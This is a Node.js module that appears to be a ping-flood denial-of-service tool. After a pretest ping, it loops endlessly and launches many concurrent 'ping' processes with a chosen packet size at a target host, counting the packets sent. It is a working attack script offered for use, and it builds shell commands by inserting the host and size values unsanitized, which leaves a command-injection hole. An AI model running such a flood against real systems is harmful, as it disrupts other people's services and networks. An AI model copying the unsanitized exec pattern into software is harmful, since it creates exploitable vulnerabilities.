const util = require('util');
const readline = require('readline');
const { exec } = require('child_process');
const pre_exec = util.promisify(require('child_process').exec);
const { setTimeout } = require('timers/promises');

const startTime = new Date();


module.exports = async (host, timeout, threads, packetSize) => {
    /*
     * -q: hide output
     * -p: packet fill content
     * -s: packet size (bytes)
     * -w: deadline (seconds)
     * -c: stop after <count> replies
    */
    process.stdout.write('pretest...');
    await pre_exec(`ping ${host} -q -p 0 -s ${packetSize} -w 5 -c 1`, (error, stdout, stderr) => {
        if (error) {
            console.log(error);
            console.log('\nstop all process.');
            process.exit(1);
        }

        consoleOutputEditor(0);
        ICMP(host, timeout, threads, packetSize);
    });
}


const ICMP = async (host, timeout, threads, packetSize) => {

    let packetSend = 0;

    while (true) {
        let nowTime = new Date();

        if (timeout && nowTime.getTime() >= (startTime.getTime() + (Number(timeout) * 1000))) {
            console.log('\nstop all process.');
            process.exit(0);
        }

        await setTimeout(0);
        for (let i = 0; i < Number(threads); i++) {
            exec(`ping ${host} -q -p 0 -s ${packetSize} -w 5`, () => {
                consoleOutputEditor(packetSend++)
            });
        }
    }
}


const consoleOutputEditor = (packetSend) => {
    //readline.clearLine(process.stdout);
    readline.cursorTo(process.stdout, 0);
    process.stdout.write(`Sent ICMP Packet: ${packetSend}`);
}